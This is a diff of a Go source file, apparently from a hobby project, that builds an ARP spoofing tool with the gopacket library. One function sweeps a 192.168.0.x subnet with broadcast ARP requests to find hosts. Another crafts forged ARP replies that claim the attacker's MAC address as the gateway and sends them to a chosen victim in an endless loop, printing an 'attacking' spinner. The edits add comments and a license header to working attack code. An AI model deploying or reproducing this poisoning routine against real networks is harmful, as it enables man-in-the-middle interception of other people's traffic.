@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: MIT
+// Copyright (c) 2025 Pythonic01
 package captureArp
 
 import (
@@ -6,7 +8,6 @@ import (
 	"log"
 	"net"
 	"time"
-
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -32,6 +33,8 @@ func craft_ip(attackerIp net.IP, destIp net.IP) *layers.IPv4 {
 	}
 	return ip;
 }
+
+//TODO: implement icmp host discovery
 func craft_icmp() *layers.ICMPv4{
 	icmp := &layers.ICMPv4{
 		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0), 
@@ -40,6 +43,7 @@ func craft_icmp() *layers.ICMPv4{
 	}
 	return icmp;
 }
+
 func craft_arp(attackerMac net.HardwareAddr, targeMac net.HardwareAddr, getwayIp net.IP, targetIp net.IP, op uint16) *layers.ARP {
 	arp := &layers.ARP{
 		AddrType:          layers.LinkTypeEthernet,
@@ -65,21 +69,25 @@ func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) 
 }
 
 func Discover_devices(handler *pcap.Handle, attackerMac net.HardwareAddr, attackerIp net.IP, ch chan string){
+	// prepare packet variables
 	buffer := gopacket.NewSerializeBuffer()
 	broadcast_mac_eth, err := net.ParseMAC("ff:ff:ff:ff:ff:ff");
 	if err != nil {
 		log.Fatal("parse Ethe mac ", err);
 	}
-
 	spin := []rune{'|', '/', '-', '\\'} // classic terminal hacker look
+
+	// carft arp header
 	eth := craft_ethernet(broadcast_mac_eth, attackerMac)
-	// FIXED: Make a function that convert these type and parse them and check them
 	broadcast_mac_arp, err := 	net.ParseMAC("00:00:00:00:00:00");
 	if err != nil {
 		log.Fatal("Error parsing target mac in discovery ", err);
 	}
+
 	spinIndex := 0
+	// TODO: FIX THIS
 	ip := "192.168.0.";
+	
 	for i := 1; i < 256 ; i++{
 
 		fullIP := fmt.Sprintf("%s%d", ip, i);
@@ -103,32 +111,38 @@ func Discover_devices(handler *pcap.Handle, attackerMac net.HardwareAddr, attack
 		time.Sleep(200 * time.Millisecond)
 	}
 	ch <- "done";
-	log.Printf("Everything goes as expected packet has been sent \n")
-	return;
 }
 
 func Packet_poison(handler *pcap.Handle, args shared.ParsedCommandLine) {
+	// initiating variables
 	buffer := gopacket.NewSerializeBuffer()
 	eth := craft_ethernet(args.VictimMAC, args.AttackerMAC)
-	// FIXED: Make a function that convert these type and parse them and check them
+	spin := []rune{'|', '/', '-', '\\'} // classic terminal hacker look
+	
+	// craft the arp request
 	arp := craft_arp(args.AttackerMAC, args.VictimMAC, args.DefaultGateway, args.VictimIP, layers.ARPReply)
+	
+	// prepare packet and send
+	spinIndex := 0;
 	opt := gopacket.SerializeOptions{
 		FixLengths:       true,
 		ComputeChecksums: true,
 	}
+
 	err := gopacket.SerializeLayers(buffer, opt, eth, arp)
 	if err != nil {
 		log.Fatal("Error serilize the packet ", err)
 	}
+
 	for {
 		err = handler.WritePacketData(buffer.Bytes())
 		if err != nil {
 			log.Fatal("Error serilize the packet ", err)
 		}
-		fmt.Printf("Sending ARP packet\n");
+
+		fmt.Printf("\r[%c] attacking", spin[spinIndex%len(spin)])
+		spinIndex++
 		time.Sleep(2 * time.Second);
 	}
 
-	log.Printf("Everything goes as expected packet has been sent \n")
-	log.Println("Eth ", eth)
 }
